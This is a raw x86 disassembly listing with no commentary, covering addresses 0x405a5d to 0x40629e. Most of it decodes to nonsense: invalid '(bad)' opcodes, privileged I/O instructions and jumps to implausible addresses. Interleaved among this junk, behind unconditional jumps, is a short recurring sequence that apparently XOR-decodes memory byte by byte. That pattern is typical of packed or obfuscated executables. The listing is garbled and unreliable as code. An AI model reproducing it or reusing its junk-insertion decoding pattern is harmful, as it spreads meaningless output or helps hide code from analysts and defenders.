  405a5d:	out    dx,al
  405a5e:	mov    esp,0x1ac10dba
  405a63:	pop    eax
  405a64:	mov    eax,ds:0xbdbe5ea
  405a69:	not    DWORD PTR [ecx+0x2f736469]
  405a6f:	xchg   esp,eax
  405a70:	xor    ah,0xaa
  405a73:	sbb    edx,eax
  405a75:	adc    eax,0xa78f8e32
  405a7a:	pop    eax
  405a7b:	sar    DWORD PTR [ebp-0x37c56bf2],1
  405a81:	mov    eax,0x7af18d59
  405a86:	jns    0x405ac5
  405a88:	jecxz  0x405ab8
  405a8a:	icebp  
  405a8b:	xor    al,0x44
  405a8d:	pop    esi
  405a8e:	or     bh,BYTE PTR [edx-0x29]
  405a91:	lock sbb eax,0x29c431b5
  405a97:	jecxz  0x405ac6
  405a99:	std    
  405a9a:	push   ds
  405a9b:	sub    al,0x7b
  405a9d:	rcr    esi,1
  405a9f:	test   al,0xcc
  405aa1:	push   edx
  405aa2:	adc    BYTE PTR ds:0xbb3fd7fe,ah
  405aa8:	sub    al,0xae
  405aaa:	(bad)  
  405aab:	push   eax
  405aac:	rcr    BYTE PTR [ebx],cl
  405aae:	add    al,0xf8
  405ab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ab1:	push   edi
  405ab2:	mov    al,ds:0x63e83e95
  405ab7:	sbb    cl,dh
  405ab9:	dec    DWORD PTR [ebx]
  405abb:	xchg   edx,eax
  405abc:	and    bh,BYTE PTR [eax]
  405abe:	je     0x405b17
  405ac0:	push   ss
  405ac1:	iret   
  405ac2:	arpl   WORD PTR [ecx-0x77],bx
  405ac5:	and    al,0x65
  405ac7:	and    edi,DWORD PTR [edi]
  405ac9:	mov    esp,0x52470313
  405ace:	push   ebp
  405acf:	int3   
  405ad0:	popf   
  405ad1:	cwde   
  405ad2:	(bad)  
  405ad3:	jmp    0x847870e1
  405ad8:	cs fs push esi
  405adb:	pop    ds
  405adc:	test   DWORD PTR [ecx-0x1ae841f7],ebp
  405ae2:	aam    0x2d
  405ae4:	and    DWORD PTR fs:[eax],edx
  405ae7:	outs   dx,BYTE PTR ds:[esi]
  405ae8:	jae    0x405b4b
  405aea:	jns    0x405aba
  405aec:	push   ss
  405aed:	mov    DWORD PTR [ebp-0x18],0xebeb4fd6
  405af4:	mov    DWORD PTR [ebp-0x14],eax
  405af7:	mov    eax,DWORD PTR [ebp-0x38]
  405afa:	dec    DWORD PTR ds:0x4335ac
  405b00:	mov    edx,DWORD PTR [ebp-0x34]
  405b03:	cmp    DWORD PTR ds:0x433658,0x0
  405b0a:	jle    0x405b1b
  405b10:	jmp    0x405b1b
  405b15:	call   DWORD PTR ds:0x43c7f0
  405b1b:	xor    eax,esi
  405b1d:	lea    eax,[ebp+eax*1-0x66479db7]
  405b24:	mov    DWORD PTR [ebp+0x10],eax
  405b27:	mov    eax,DWORD PTR [ebp-0x38]
  405b2a:	mov    edx,DWORD PTR [ebp-0x34]
  405b2d:	mov    edx,DWORD PTR [ebp-0x8]
  405b30:	xor    eax,esi
  405b32:	adc    DWORD PTR ds:0x4335fc,0x696
  405b3c:	mov    dl,BYTE PTR [eax+edx*1-0x66479db3]
  405b43:	mov    eax,ds:0x4335f0
  405b48:	adc    DWORD PTR ds:0x4335ac,eax
  405b4e:	jmp    0x405c26
  405b53:	call   0xfeb70bfe
  405b58:	jbe    0x405b48
  405b5a:	mov    esi,0x7091e41d
  405b5f:	pop    es
  405b60:	loopne 0x405bdf
  405b62:	in     al,0xd4
  405b64:	sub    eax,DWORD PTR [eax]
  405b66:	add    BYTE PTR [ebx+0x43000000],bh
  405b6c:	fs pop ebp
  405b6e:	not    BYTE PTR [edx-0x6af20981]
  405b74:	(bad)  
  405b75:	cld    
  405b76:	add    eax,0x1c5aa008
  405b7b:	(bad)  
  405b7d:	jmp    0x4748e83b
  405b82:	out    0x8b,eax
  405b84:	inc    eax
  405b85:	jno    0x405bc8
  405b87:	ja     0x405bbf
  405b89:	js     0x405bd3
  405b8b:	inc    ebx
  405b8c:	sbb    ax,0xcb07
  405b90:	or     bl,bl
  405b92:	sar    BYTE PTR [edi+0x78],cl
  405b95:	cmp    BYTE PTR [eax+0x33],bh
  405b98:	adc    esi,0xfffffffe
  405b9b:	gs (bad) 
  405b9e:	aas    
  405b9f:	ffree  st(2)
  405ba1:	mov    DWORD PTR [esi*8+0x696b9da],edi
  405ba8:	cmc    
  405ba9:	push   es
  405baa:	mov    ebp,edi
  405bac:	int3   
  405bad:	addr16 out 0xa4,al
  405bb0:	xor    bl,BYTE PTR [ebp-0x5]
  405bb3:	test   eax,0x195f3f6e
  405bb8:	mov    al,cl
  405bba:	into   
  405bbb:	icebp  
  405bbc:	mov    ecx,0x1a71c5a0
  405bc1:	push   es
  405bc2:	aam    0x75
  405bc4:	mov    al,0xc8
  405bc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bc7:	mov    eax,?
  405bc9:	ins    BYTE PTR es:[edi],dx
  405bca:	xchg   edx,eax
  405bcb:	es pushf 
  405bcd:	or     bh,BYTE PTR [ebp-0x77]
  405bd0:	das    
  405bd1:	jg     0x405b85
  405bd3:	je     0x405bd7
  405bd5:	dec    esi
  405bd6:	pop    esp
  405bd7:	mov    dl,0x5b
  405bd9:	unpckhps xmm5,XMMWORD PTR [edi-0x4f]
  405bdd:	cmp    edx,DWORD PTR [esi-0xb9069b2]
  405be3:	sbb    BYTE PTR [edx-0x22],bh
  405be6:	pop    edi
  405be7:	mov    edi,esi
  405be9:	dec    edi
  405bea:	push   0xe1d131ae
  405bef:	shr    BYTE PTR [ebp-0x5ffd08ca],cl
  405bf5:	push   0xffffff97
  405bf7:	xchg   edi,eax
  405bf8:	jg     0x405c1f
  405bfa:	xor    DWORD PTR [edi+0x2c],ebp
  405bfd:	inc    edi
  405bfe:	and    al,0x52
  405c00:	addr16 imul edx,edi,0x23
  405c04:	cmp    ah,BYTE PTR [ebx]
  405c06:	mov    dl,0x52
  405c08:	pop    eax
  405c09:	sbb    BYTE PTR [esi+0xd],0x85
  405c0d:	retf   
  405c0e:	cli    
  405c0f:	popf   
  405c10:	cmp    eax,0x2f66d844
  405c15:	mov    ebp,ebp
  405c17:	test   eax,0x21fd5f0f
  405c1c:	imul   ebp,DWORD PTR [eax],0xee376989
  405c22:	mov    eax,ds:0x8bdf790e
  405c27:	inc    ebp
  405c28:	adc    BYTE PTR [ecx+0x4335c805],al
  405c2e:	add    BYTE PTR [eax],bh
  405c30:	push   esp
  405c31:	add    BYTE PTR [eax],al
  405c33:	jmp    0x405d0b
  405c38:	lods   eax,DWORD PTR ds:[esi]
  405c39:	mov    ah,0x52
  405c3b:	mov    ebx,0xb6edff5b
  405c40:	ds hlt 
  405c42:	bound  ecx,QWORD PTR [esi-0x77]
  405c45:	pop    ebp
  405c46:	mov    eax,ds:0x2c8fa1
  405c4b:	add    BYTE PTR [ebx+0x26000000],bh
  405c51:	ss idiv bh
  405c54:	jg     0x405c1e
  405c56:	add    al,0xad
  405c58:	inc    esp
  405c59:	jmp    0x790d:0x8c5236f4
  405c60:	(bad)  
  405c61:	call   0xef307462
  405c66:	cld    
  405c67:	je     0x405c51
  405c69:	mov    edi,0x75373247
  405c6e:	mov    ebx,0x5450b243
  405c73:	(bad)  
  405c74:	xlat   BYTE PTR ds:[ebx]
  405c75:	int3   
  405c76:	mov    BYTE PTR [ecx+0x32],dh
  405c79:	dec    eax
  405c7a:	mov    edx,ecx
  405c7c:	cld    
  405c7d:	lea    esi,[edi+0x3b9485ac]
  405c83:	imul   edi,DWORD PTR [ebp-0x2e],0x44b2ec05
  405c8a:	btr    DWORD PTR [ecx+0x2163424b],edi
  405c91:	ss mov al,0xd4
  405c94:	(bad)  
  405c96:	dec    ebp
  405c97:	or     al,0x2e
  405c99:	vandps ymm2,ymm3,YMMWORD PTR ds:0x7971fa8c
  405ca1:	in     al,0x19
  405ca3:	aaa    
  405ca4:	push   edx
  405ca5:	mov    ah,0x52
  405ca7:	out    dx,al
  405ca8:	mov    DWORD PTR [edx+0x6b],esi
  405cab:	mov    al,ds:0xedc74adf
  405cb0:	inc    ecx
  405cb1:	mov    cl,0x91
  405cb3:	(bad)  
  405cb4:	loope  0x405c94
  405cb6:	inc    ecx
  405cb7:	mov    cl,0xc5
  405cb9:	repnz xchg ebp,eax
  405cbb:	cld    
  405cbc:	bound  eax,QWORD PTR [ebp+0x74]
  405cbf:	xchg   esi,eax
  405cc0:	jp     0x405c4e
  405cc2:	add    al,0x72
  405cc4:	push   esi
  405cc5:	adc    edi,DWORD PTR [esi-0x1c6304fe]
  405ccb:	push   ss
  405ccc:	ja     0x405cc9
  405cce:	test   edx,edi
  405cd0:	ret    0x75ae
  405cd3:	inc    ebx
  405cd4:	retf   0x1dcc
  405cd7:	test   al,0xa5
  405cd9:	bound  esi,QWORD PTR [eax+0x41]
  405cdc:	addr16 inc edx
  405cde:	fidivr DWORD PTR ds:0xbddb964d
  405ce4:	stc    
  405ce5:	fsubr  DWORD PTR [eax-0x2f]
  405ce8:	sbb    BYTE PTR [edi-0x29],dh
  405ceb:	fadd   QWORD PTR [esi+0x679ab873]
  405cf1:	mov    ecx,DWORD PTR [edx-0x6c]
  405cf4:	outs   dx,DWORD PTR ds:[esi]
  405cf5:	data16 or al,0xb9
  405cf8:	gs (bad) 
  405cfa:	mov    bh,0xfb
  405cfc:	pop    edi
  405cfd:	mov    ah,0x5b
  405cff:	loope  0x405d31
  405d01:	js     0x405ce9
  405d03:	push   ebp
  405d04:	sub    al,0x44
  405d06:	mul    al
  405d08:	aaa    
  405d09:	pop    es
  405d0a:	cdq    
  405d0b:	xor    BYTE PTR [eax],dl
  405d0d:	cmp    DWORD PTR ds:0x433548,0x0
  405d14:	jge    0x405e12
  405d1a:	jmp    0x405e12
  405d1f:	push   DWORD PTR [ebp-0x20]
  405d22:	push   0x7457
  405d27:	push   DWORD PTR [ebp-0x14]
  405d2a:	push   0x1f8a
  405d2f:	push   0x3348
  405d34:	call   DWORD PTR ds:0x43c7f4
  405d3a:	jmp    0x405e12
  405d3f:	dec    eax
  405d40:	or     edi,edi
  405d42:	arpl   di,di
  405d44:	neg    esp
  405d46:	sub    ebx,DWORD PTR [ecx]
  405d48:	sub    ch,0x74
  405d4b:	fidiv  WORD PTR [edx+ebp*1]
  405d4e:	dec    esi
  405d4f:	dec    edx
  405d50:	sub    eax,0xbb0000
  405d55:	add    BYTE PTR [eax],al
  405d57:	call   0x3932:0xdde6ce17
  405d5e:	or     edx,0x4b
  405d61:	pop    es
  405d62:	mov    al,ds:0xee999ff3
  405d67:	adc    eax,0x503ba4df
  405d6c:	xchg   esi,eax
  405d6d:	out    dx,al
  405d6e:	in     eax,dx
  405d6f:	iret   
  405d70:	mov    dl,0x99
  405d72:	mov    al,0xff
  405d74:	ins    BYTE PTR es:[edi],dx
  405d75:	mov    al,ds:0x7df25f4
  405d7a:	jns    0x405d6e
  405d7c:	lods   al,BYTE PTR ds:[esi]
  405d7d:	ficom  DWORD PTR [esi+0x16]
  405d80:	loopne 0x405d81
  405d82:	sahf   
  405d83:	loopne 0x405d93
  405d85:	js     0x405e00
  405d87:	sub    eax,ecx
  405d89:	mov    ss,WORD PTR [ebx]
  405d8b:	scas   eax,DWORD PTR es:[edi]
  405d8c:	sub    al,BYTE PTR [eax+0x51]
  405d8f:	das    
  405d90:	cmc    
  405d91:	jge    0x405da4
  405d93:	adc    BYTE PTR [ecx],bh
  405d95:	rol    DWORD PTR [eax-0x731f7ec2],1
  405d9b:	out    0x2b,eax
  405d9d:	inc    ebx
  405d9e:	daa    
  405d9f:	popa   
  405da0:	xchg   DWORD PTR [edi-0x5ab5acf2],ecx
  405da6:	cmc    
  405da7:	adc    bl,BYTE PTR [esi]
  405da9:	jo     0x405db9
  405dab:	dec    eax
  405dac:	out    0x6,eax
  405dae:	aas    
  405daf:	mov    ds:0x4235da80,al
  405db4:	jg     0x405e01
  405db6:	adc    ebx,DWORD PTR [ecx-0x2da706a8]
  405dbc:	push   edi
  405dbd:	repz (bad)
  405dc0:	xchg   ebx,eax
  405dc1:	xor    DWORD PTR [ecx-0x39],eax
  405dc4:	lea    esp,[eax+0x1c]
  405dc7:	xchg   edi,eax
  405dc8:	fidiv  WORD PTR [eax+ebp*4-0x5a2f6c47]
  405dcf:	cld    
  405dd0:	enter  0xc278,0x7c
  405dd4:	jle    0x405e15
  405dd6:	outs   dx,BYTE PTR ds:[esi]
  405dd7:	(bad)  
  405dd8:	pusha  
  405dd9:	pop    edx
  405dda:	push   esi
  405ddb:	add    BYTE PTR [ebp+0x7c],dh
  405dde:	sbb    BYTE PTR [esi-0x72],al
  405de1:	push   cs
  405de2:	pop    es
  405de3:	aad    0xe9
  405de5:	cmc    
  405de6:	inc    edx
  405de7:	mov    ecx,0x8b0eed9
  405dec:	lods   eax,DWORD PTR ds:[esi]
  405ded:	cmp    esi,DWORD PTR [eax+0x18]
  405df0:	int    0xd1
  405df2:	addr16 or al,0x9f
  405df5:	or     dl,ch
  405df7:	inc    esi
  405df8:	jle    0x405e73
  405dfa:	xor    eax,0xe5b7e64d
  405dff:	shl    BYTE PTR [edx],cl
  405e01:	cli    
  405e02:	leave  
  405e03:	xor    eax,0xc153e7fc
  405e08:	cld    
  405e09:	into   
  405e0a:	xchg   ebp,eax
  405e0b:	ins    BYTE PTR es:[edi],dx
  405e0c:	mov    edi,0xfe5066de
  405e11:	xchg   ebx,eax
  405e12:	mov    eax,DWORD PTR [ebp-0x28]
  405e15:	mov    edx,DWORD PTR [ebp-0x24]
  405e18:	xor    eax,esi
  405e1a:	lea    eax,[ebp+eax*1-0x66479db7]
  405e21:	jmp    0x405ef9
  405e26:	inc    ebp
  405e27:	add    dh,BYTE PTR [ebx+0x16]
  405e2a:	ja     0x405ea3
  405e2c:	gs push ebx
  405e2e:	add    esi,DWORD PTR [ecx]
  405e30:	mov    edx,0x7fd9a5e4
  405e35:	or     eax,0x2e05
  405e3a:	mov    ebx,0xb4000000
  405e3f:	fidivr WORD PTR [ebx+ebx*8+0x76a7399d]
  405e46:	pop    ss
  405e47:	jns    0x405e54
  405e49:	jge    0x405df6
  405e4b:	cmovb  esi,DWORD PTR [edx-0xc7d604e]
  405e52:	popf   
  405e53:	sub    ebx,DWORD PTR [edx-0x707a4d4d]
  405e59:	mov    dh,0x1b
  405e5b:	xchg   edx,eax
  405e5c:	push   ds
  405e5d:	cmp    cl,dl
  405e5f:	lea    edx,[edx]
  405e61:	jmp    0x382e:0x4ff2ff22
  405e68:	jo     0x405e99
  405e6a:	push   ebx
  405e6b:	cmc    
  405e6c:	inc    esi
  405e6d:	xchg   bh,ch
  405e6f:	or     cl,ah
  405e71:	stc    
  405e72:	or     eax,DWORD PTR [esi+0x32e8d078]
  405e78:	stc    
  405e79:	jl     0x405e3a
  405e7b:	fsubr  QWORD PTR [ecx+0x1c2ea0ef]
  405e81:	mov    ebp,0x9510713
  405e86:	and    eax,0xdbb3676a
  405e8b:	out    0xbc,eax
  405e8d:	test   ebx,edx
  405e8f:	fist   DWORD PTR [ebx-0x33]
  405e92:	sbb    ecx,DWORD PTR [edx]
  405e94:	sub    al,0x98
  405e96:	sub    eax,0xf75915b8
  405e9b:	pop    ebx
  405e9c:	add    ebp,ebx
  405e9e:	xchg   edx,eax
  405e9f:	(bad)  
  405ea0:	mov    edx,0x37663b4b
  405ea5:	pusha  
  405ea6:	loop   0x405ecc
  405ea8:	sbb    al,0x4b
  405eaa:	mov    esi,0xdc53e5f4
  405eaf:	mov    ?,eax
  405eb1:	pop    ecx
  405eb2:	rcr    DWORD PTR [eax-0x1cf112ea],1
  405eb8:	adc    eax,DWORD PTR [ecx+0x4b2d5f94]
  405ebe:	repz ja 0x405e6d
  405ec1:	dec    esi
  405ec2:	cmp    al,0xe6
  405ec4:	test   al,0xd
  405ec6:	mov    dl,0xa8
  405ec8:	push   esi
  405ec9:	(bad)  
  405eca:	adc    BYTE PTR [eax+0x7f],bh
  405ecd:	(bad)  
  405ece:	outs   dx,DWORD PTR ds:[esi]
  405ecf:	out    dx,al
  405ed0:	sbb    ah,al
  405ed2:	jns    0x405efb
  405ed4:	mov    WORD PTR [esi],gs
  405ed6:	cmp    eax,0x59e8f619
  405edb:	push   ecx
  405edc:	and    eax,0x8a4105e
  405ee1:	addr16 popf 
  405ee3:	push   0x6dedb36e
  405ee8:	pop    es
  405ee9:	ret    
  405eea:	and    ah,BYTE PTR [eax]
  405eec:	leave  
  405eed:	imul   esp,DWORD PTR [ebp-0x68],0x63
  405ef1:	fwait
  405ef2:	mov    ds:0xa97c0b0b,al
  405ef7:	jno    0x405ea3
  405ef9:	mov    DWORD PTR [ebp+0x10],eax
  405efc:	jmp    0x405fd4
  405f01:	jno    0x405f23
  405f03:	wbinvd 
  405f05:	pop    edi
  405f06:	das    
  405f07:	ja     0x405f81
  405f09:	repnz out dx,eax
  405f0b:	sbb    DWORD PTR [edi-0x58],0xc06566d9
  405f12:	add    BYTE PTR cs:[eax],al
  405f15:	mov    ebx,0x8a000000
  405f1a:	out    dx,eax
  405f1b:	mov    edx,0x62277cd3
  405f20:	jo     0x405eb3
  405f22:	jno    0x405ef9
  405f24:	out    0x46,eax
  405f26:	shl    DWORD PTR [ebx+esi*1+0x4251a8ad],1
  405f2d:	xor    DWORD PTR [ecx],esp
  405f2f:	pop    ebx
  405f30:	add    DWORD PTR [eax+0x3b],edi
  405f33:	scas   eax,DWORD PTR es:[edi]
  405f34:	inc    ebp
  405f35:	sub    BYTE PTR [ebx-0x25],dl
  405f38:	mov    WORD PTR [edi-0x665f07aa],?
  405f3e:	or     ecx,ebx
  405f40:	retf   
  405f41:	addr16 ss aad 0x16
  405f45:	and    BYTE PTR [edx+0x6b3e4933],al
  405f4b:	push   ebx
  405f4c:	mov    ebx,DWORD PTR [esp+ecx*2+0x2af1b8b5]
  405f53:	das    
  405f54:	pop    edi
  405f55:	inc    ecx
  405f56:	push   cs
  405f57:	ins    BYTE PTR es:[edi],dx
  405f58:	or     BYTE PTR [edi-0x6ccd32c6],dh
  405f5e:	mov    bl,0xc6
  405f60:	nop
  405f61:	dec    BYTE PTR [edx-0x33b76285]
  405f67:	cmc    
  405f68:	mov    esi,0xd75ae1d0
  405f6d:	cmc    
  405f6e:	out    dx,al
  405f6f:	into   
  405f70:	lods   al,BYTE PTR ds:[esi]
  405f71:	nop
  405f72:	mov    ebp,0x4ce7a4fa
  405f77:	pop    ebx
  405f78:	sti    
  405f79:	div    DWORD PTR [edi+0x1a]
  405f7c:	ins    BYTE PTR es:[edi],dx
  405f7d:	repnz fnstenv [esi*4+0x48d6cac2]
  405f85:	jnp    0x405f2c
  405f87:	adc    ch,BYTE PTR ss:[ecx+0x1d]
  405f8b:	es push ecx
  405f8d:	clc    
  405f8e:	mov    cl,0x40
  405f90:	imul   ebx,ebx,0x60ad7ff8
  405f96:	stos   DWORD PTR es:[edi],eax
  405f97:	ror    DWORD PTR [ecx-0x53097d4a],1
  405f9d:	loop   0x405fa2
  405f9f:	mov    bl,0xd0
  405fa1:	inc    esi
  405fa2:	cdq    
  405fa3:	cdq    
  405fa4:	jmp    0xa8583368
  405fa9:	or     al,0x7a
  405fab:	das    
  405fac:	sahf   
  405fad:	jno    0x405f61
  405faf:	call   0x66c67f1a
  405fb4:	mov    esp,0xbea7f687
  405fb9:	rol    BYTE PTR [esi],0xdf
  405fbc:	pop    eax
  405fbd:	sbb    BYTE PTR gs:[ebx+edi*1+0x767a66a1],dl
  405fc5:	clc    
  405fc6:	cmp    al,0xdd
  405fc8:	or     esi,DWORD PTR [ebx-0x6f]
  405fcb:	and    ch,BYTE PTR [eax-0x2e780b50]
  405fd1:	mov    bl,0x98
  405fd3:	and    eax,0xe9d8458b
  405fd8:	rol    DWORD PTR [eax],cl
  405fda:	add    BYTE PTR [eax],al
  405fdc:	imul   ebx,DWORD PTR [eax+0x73],0x1b
  405fe0:	jae    0x40601d
  405fe2:	imul   edi,DWORD PTR [eax+0x67],0xffffffc0
  405fe6:	fdiv   DWORD PTR [ebx]
  405fe8:	ret    0x970b
  405feb:	in     al,0x7b
  405fed:	das    
  405fee:	add    BYTE PTR [eax],al
  405ff0:	mov    ebx,0xb4000000
  405ff5:	dec    ebp
  405ff6:	jne    0x405f9f
  405ff8:	and    BYTE PTR [edx],0x34
  405ffb:	inc    esp
  405ffc:	out    dx,eax
  405ffd:	cmp    bl,bl
  405fff:	stc    
  406000:	pop    ebx
  406001:	mov    al,0xa4
  406003:	xor    eax,0x8ce23371
  406008:	into   
  406009:	push   es
  40600a:	ja     0x405f91
  40600c:	or     BYTE PTR gs:[ebp+0x1d363dcf],dh
  406013:	daa    
  406014:	add    cl,BYTE PTR [ecx+eax*2-0x61]
  406018:	cmp    DWORD PTR [edx+0x667098d8],ebx
  40601e:	cmp    ebx,DWORD PTR [eax]
  406020:	fld    TBYTE PTR [ecx-0x133ed87c]
  406026:	lea    esi,[eax+0x33]
  406029:	add    al,BYTE PTR [edx]
  40602b:	addr16 mov eax,0x958fbcbb
  406031:	fbstp  TBYTE PTR [eax]
  406033:	mov    bl,0x0
  406035:	xor    al,0x43
  406037:	pop    edi
  406038:	mov    esi,0x57082c1e
  40603d:	push   0xe1000dee
  406042:	xor    al,0xb2
  406044:	cld    
  406045:	dec    eax
  406046:	mov    esp,0x295fe4a4
  40604b:	sub    esi,edx
  40604d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40604e:	jmp    0x5f30bbe6
  406053:	ffreep st(1)
  406055:	loopne 0x405fe9
  406057:	add    esp,DWORD PTR [ebp-0x637a199c]
  40605d:	jmp    0x405fe2
  40605f:	scas   al,BYTE PTR es:[edi]
  406060:	sbb    edi,eax
  406062:	fs cmp eax,0xa28eeccb
  406068:	pusha  
  406069:	jb     0x40607f
  40606b:	jns    0x406063
  40606d:	or     DWORD PTR [eax+edi*8],0xffffffbc
  406071:	(bad)  
  406072:	ficom  WORD PTR [edx-0xe0e830d]
  406078:	jecxz  0x4060e3
  40607a:	sub    al,0x4d
  40607c:	int3   
  40607d:	adc    ebx,DWORD PTR [ecx]
  40607f:	pop    esi
  406080:	xor    al,0x19
  406082:	les    ebx,FWORD PTR [ebp+0x1b900f2b]
  406088:	xor    ecx,ebp
  40608a:	imul   ebx,DWORD PTR [edx],0x8d1e242e
  406090:	and    eax,0xedbe72cc
  406095:	out    dx,al
  406096:	adc    al,0xec
  406098:	xor    ah,0x85
  40609b:	or     ebp,DWORD PTR [eax+0x348d0be7]
  4060a1:	sub    DWORD PTR [esi+0x62f29e24],ecx
  4060a7:	mov    al,0x92
  4060a9:	test   al,0xf1
  4060ab:	nop
  4060ac:	mov    fs,WORD PTR [ebp-0x23aa74cb]
  4060b2:	mov    edx,DWORD PTR [ebp-0x8]
  4060b5:	add    DWORD PTR ds:0x43361c,0x4335f8
  4060bf:	jmp    0x406197
  4060c4:	sbb    DWORD PTR [ecx-0x1202760b],edx
  4060ca:	jge    0x40605d
  4060cc:	(bad)
  4060cf:	xor    esi,DWORD PTR [ebx]
  4060d1:	push   0x3036692a
  4060d6:	add    BYTE PTR [eax],al
  4060d8:	mov    ebx,0x5c000000
  4060dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060de:	push   eax
  4060df:	pusha  
  4060e0:	mov    bh,dl
  4060e2:	ret    
  4060e3:	ja     0x40610b
  4060e5:	aas    
  4060e6:	lds    ecx,FWORD PTR [esp+ebp*2]
  4060e9:	fiadd  DWORD PTR ds:0x32f6c9eb
  4060ef:	or     BYTE PTR [esi],bh
  4060f1:	stc    
  4060f2:	lds    ebx,FWORD PTR ds:0x7a67c9d6
  4060f8:	aad    0x1d
  4060fa:	inc    ebx
  4060fb:	mov    ss,WORD PTR [ebx]
  4060fd:	push   ebx
  4060fe:	not    DWORD PTR [edi]
  406100:	inc    ecx
  406101:	lods   eax,DWORD PTR ds:[esi]
  406102:	jae    0x406107
  406104:	daa    
  406105:	shr    bl,cl
  406107:	sub    DWORD PTR [ebx-0x4ffb8282],edi
  40610d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40610e:	out    0x7f,eax
  406110:	pusha  
  406111:	cmp    DWORD PTR [ecx+ecx*1+0x1e],0x6d
  406116:	cmc    
  406117:	aaa    
  406118:	mov    ah,ch
  40611a:	xor    esp,eax
  40611c:	xchg   ebp,ecx
  40611e:	dec    esi
  40611f:	into   
  406120:	sub    dh,ch
  406122:	icebp  
  406123:	hlt    
  406124:	jb     0x4060d9
  406126:	scas   eax,DWORD PTR es:[edi]
  406127:	mov    DWORD PTR [esp+eax*4-0x64],esp
  40612b:	popa   
  40612c:	push   es
  40612d:	and    BYTE PTR [ecx],al
  40612f:	imul   edi,DWORD PTR [edi+0x2c],0xc8ee2582
  406136:	or     al,0xe6
  406138:	icebp  
  406139:	ret    
  40613a:	mov    DWORD PTR [edx-0x3683a85b],ebx
  406140:	adc    BYTE PTR [edx+0x1c],bl
  406143:	js     0x406145
  406145:	imul   BYTE PTR [edi-0x3c]
  406148:	cmp    BYTE PTR [edx-0x15],bl
  40614b:	pop    esi
  40614c:	pop    ebp
  40614d:	je     0x406189
  40614f:	test   al,0x7f
  406151:	sbb    DWORD PTR [esi+0x24fecf2a],ebx
  406157:	mov    edi,esi
  406159:	mov    ah,al
  40615b:	sbb    eax,0x508198e
  406160:	inc    esi
  406161:	sar    BYTE PTR [ebp+0xb8632c],cl
  406167:	fwait
  406168:	mov    ds:0x19c4e026,al
  40616d:	sahf   
  40616e:	sbb    esi,edi
  406170:	or     al,0x28
  406172:	sub    DWORD PTR [ebx-0x7c],ebx
  406175:	shr    BYTE PTR [ebx],1
  406177:	sahf   
  406178:	jno    0x406198
  40617a:	inc    ebx
  40617b:	rol    dl,0xee
  40617e:	stc    
  40617f:	cmp    DWORD PTR [eax-0x3e],0x78
  406183:	nop
  406184:	mov    esi,0x13833203
  406189:	pop    eax
  40618a:	mov    esi,0xe381cb62
  40618f:	ja     0x406189
  406191:	jnp    0x4061b3
  406193:	into   
  406194:	fwait
  406195:	jge    0x406118
  406197:	xor    eax,esi
  406199:	mov    dl,BYTE PTR [eax+edx*1-0x66479db3]
  4061a0:	mov    eax,DWORD PTR [ebp+0x10]
  4061a3:	mov    DWORD PTR ds:0x4335e4,0xb68
  4061ad:	xor    BYTE PTR [eax],dl
  4061af:	mov    eax,ds:0x43356c
  4061b4:	or     DWORD PTR ds:0x433554,eax
  4061ba:	jmp    0x406292
  4061bf:	stos   BYTE PTR es:[edi],al
  4061c0:	ficomp DWORD PTR [eax-0x1129072c]
  4061c6:	(bad)  
  4061c7:	in     al,0xfd
  4061c9:	aad    0xbf
  4061cb:	cld    
  4061cc:	fldenv [ecx+edi*1+0x30f1]
  4061d3:	mov    ebx,0x4b000000
  4061d8:	dec    edx
  4061d9:	inc    ebx
  4061da:	pop    ss
  4061db:	(bad)
  4061df:	aas    
  4061e0:	push   ebp
  4061e1:	adc    dl,BYTE PTR [edx]
  4061e3:	repnz bound ecx,QWORD PTR [ecx+ecx*1-0xd]
  4061e8:	jg     0x406172
  4061ea:	xchg   ecx,eax
  4061eb:	or     ch,cl
  4061ed:	add    esi,DWORD PTR [edx+0x2eae12c5]
  4061f3:	aad    0xfa
  4061f5:	cmp    al,0xef
  4061f7:	lds    esp,FWORD PTR [eax-0x26]
  4061fa:	imul   esi,DWORD PTR [ecx-0x44],0xdabe4c67
  406201:	scas   al,BYTE PTR es:[edi]
  406202:	mov    bh,0x11
  406204:	ja     0x406265
  406206:	push   edx
  406207:	ja     0x4061a1
  406209:	jae    0x4061f7
  40620b:	xchg   esi,eax
  40620c:	xor    DWORD PTR [eax],esp
  40620e:	adc    eax,0xcaae3fe3
  406213:	aaa    
  406214:	ficom  WORD PTR [edi+edi*8+0x51]
  406218:	jns    0x40623d
  40621a:	lds    edx,FWORD PTR [eax+0xb220be9]
  406220:	xor    eax,0x8e49f23b
  406225:	sub    ebp,DWORD PTR [ebp+0x783a07a1]
  40622b:	and    dl,BYTE PTR [esi+0x20]
  40622e:	js     0x406239
  406230:	imul   esi,DWORD PTR [edx+eiz*1+0x3a54770e],0x4d29b628
  40623b:	loope  0x40622a
  40623d:	xor    eax,0xe7978bc
  406242:	int    0xda
  406244:	pop    es
  406245:	test   esp,esp
  406247:	dec    esi
  406248:	imul   edx,edx,0x78
  40624b:	mul    DWORD PTR [esi]
  40624d:	xor    ch,ah
  40624f:	int3   
  406250:	stos   DWORD PTR es:[edi],eax
  406251:	adc    eax,DWORD PTR gs:[ebp-0x5bf0b0dc]
  406258:	dec    edi
  406259:	push   esi
  40625a:	idiv   DWORD PTR [ebx-0x14]
  40625d:	lds    edx,FWORD PTR [esi+0x2d]
  406260:	pushf  
  406261:	dec    edx
  406262:	(bad)  
  406264:	mov    dh,0x61
  406266:	stos   DWORD PTR es:[edi],eax
  406267:	xchg   ebx,eax
  406268:	mov    ds:0x2f37e9cc,al
  40626d:	xchg   ebp,eax
  40626e:	xchg   esi,eax
  40626f:	sbb    edx,DWORD PTR ds:0x56cc7260
  406275:	jmp    DWORD PTR [edi+0x621ce208]
  40627b:	stos   DWORD PTR es:[edi],eax
  40627c:	sahf   
  40627d:	push   ebp
  40627e:	inc    ebx
  40627f:	sti    
  406280:	pop    edx
  406281:	mov    esp,0xac1a4cab
  406286:	mov    DWORD PTR [edx-0x43],ebx
  406289:	jg     0x4062ba
  40628b:	cmp    eax,0x1dfdb78f
  406290:	add    DWORD PTR [ebx+ecx*4+0x1d01e045],ebx
  406297:	and    al,0x36
  406299:	inc    ebx
  40629a:	add    cl,ch
  40629c:	rol    DWORD PTR [eax],cl
  40629e:	add    BYTE PTR [eax],al
